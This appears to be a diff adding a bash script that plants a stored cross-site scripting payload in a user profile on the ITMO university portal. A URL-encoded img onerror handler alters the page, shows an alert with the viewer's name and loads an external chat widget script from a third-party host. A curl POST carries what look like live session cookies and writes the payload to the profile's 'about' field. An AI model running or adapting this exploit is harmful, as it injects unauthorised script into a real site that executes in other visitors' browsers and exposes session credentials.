@@ -1,0 +1,21 @@
+#!/bin/bash
+SCRIPT='%3Cimg%20class%3D%22exploitimg%22%20src%3D%22%2F%22%20onerror%3D%22%28%0A%20%20function%28%29%7B%0A%20%20%20%20if%20%28%24%28%27div.triggerexplt%27%29%5B0%5D%20%3D%3D%3D%20undefined%29%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27.exploitimg%27%29.attr%28%27onerror%27%2C%20%27%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23left_main_person_info%3Ediv%3Edl%3Edd%3Eul%27%29.append%28%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3C%2Fli%3E%0A%20%20%20%20%20%20%20%20%20%20%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20alert%28%27%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82%20%27%20%2B%20document.getElementById%28%27USER_FIO%27%29.value.split%28%27%20%27%29.slice%281%29.join%28%27%20%27%29%20%2B%27%20%3A%29%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27.profile-content%27%29.append%28%27%3Cdiv%20id%3D%5C%27chatovod257081%5C%27%20class%3D%5C%27triggerexplt%5C%27%3E%3C%2Fdiv%3E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20var%20po%20%3D%20document.createElement%28%27script%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20po.type%20%3D%20%27text%2Fjavascript%27%3B%0A%20%20%20%20%20%20%20%20%20%20po.charset%20%3D%20%27UTF-8%27%3B%0A%20%20%20%20%20%20%20%20%20%20po.async%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20po.src%20%3D%20%28%27https%3A%27%20%3D%3D%20document.location.protocol%20%3F%20%27https%3A%27%20%3A%20%27http%3A%27%29%20%2B%20%27%2F%2Fisuifmo.chatovod.ru%2Fwidget.js%3Fheight%3D450%26divId%3Dchatovod257081%27%3B%0A%20%20%20%20%20%20%20%20%20%20var%20s%20%3D%20document.getElementsByTagName%28%27script%27%29%5B0%5D%3B%0A%20%20%20%20%20%20%20%20%20%20s.parentNode.insertBefore%28po%2C%20s%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23left_main_person_info%3Ediv%3Edl%3Edd%3Eul%27%29.append%28%27%3Cli%3E%3Cspan%20data-toggle%3D%5C%27tooltip%5C%27%20data-placement%3D%5C%27right%5C%27%20title%3D%5C%27%D0%9F%D0%BE%D0%BB%D0%BD%D0%BE%D0%BC%D0%BE%D1%87%D0%B8%D0%B5%5C%27%3E%3Ci%20class%3D%5C%27far%20fa-circle%20text-light-gray%20text-xs%5C%27%3E%3C%2Fi%3E%3C%2Fspan%3E%20%D1%80%D1%83%D0%BA%D0%BE%D0%B2%D0%BE%D0%B4%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%20%D0%BA%D0%BB%D1%83%D0%B1%D0%B0%2C%20%3Ca%20href%3D%5C%27https%3A%2F%2Fisu.ifmo.ru%2Fpls%2Fapex%2Ff%3Fp%3D2143%3ADEP%3A116628533992806%3A%3ANO%3ARP%3ABUN_BUN_ID%2CSTR_STR_ID%2CUBU_UBU_ID%3A99079%2C30%2C%5C%27%3E%D0%90%D0%BD%D1%82%D0%B8%D0%B0%D0%B4%D0%B0%D0%BF%D1%82%D0%B5%D1%80%3C%2Fa%3E%20%3Ca%20href%3D%5C%27f%3Fp%3D2143%3ASTRUCT%3A116628533992806%3A%3ANO%3ARP%3ALIST_STR_STR_ID%3A30%5C%27%20class%3D%5C%27text-default%20text-super%5C%27%3E%3Ci%20class%3D%5C%27fa%20fa-cube%5C%27%3E%3C%2Fi%3E%20ITMO.STUDENTS%3C%2Fa%3E%3C%2Fli%3E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27.exploitimg%27%29.remove%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%29%28%29%3B%22%3E%0A'
+
+curl 'https://isu.ifmo.ru/pls/apex/wwv_flow.show' \
+-H 'authority: isu.ifmo.ru' \
+-H 'method: POST' \
+-H 'path: /pls/apex/wwv_flow.show' \
+-H 'dnt: 1' \
+-H 'scheme: https' \
+-H 'accept: */*' \
+-H 'accept-encoding: gzip, deflate, br' \
+-H 'accept-language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
+-H 'content-type: application/x-www-form-urlencoded' \
+-H 'cookie: ORA_WWV_RAC_INSTANCE=2; REMEMBER_ME=D14D7954F7448814B62D8398E522588C:82B2BBDA58FC4699C54FE6D2A78A5F8F; CUSTOM_COOKIE=24.12.2019 01:08:23; cf_session=KGGQVYQF; ISU_AP_COOKIE=ORA_WWV-mehzk30qqoxbTIOAd3go3dl/; ISU_LIB_SID=ORA_WWV-mehzk30qqoxbTIOAd3go3dl/' \
+-H 'origin: https://isu.ifmo.ru' \
+-H 'referer: https://isu.ifmo.ru/pls/apex/f?p=2437:7:116628533992806:::::' \
+-H 'sec-fetch-mode: cors' \
+-H 'sec-fetch-site: same-origin' \
+-H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' \
+--data 'p_request=APPLICATION_PROCESS%3DSAVE_ABOUT&p_instance=116628533992806&p_flow_id=2437&p_flow_step_id=7&x01=rus&f01='${SCRIPT} \
+--compressed
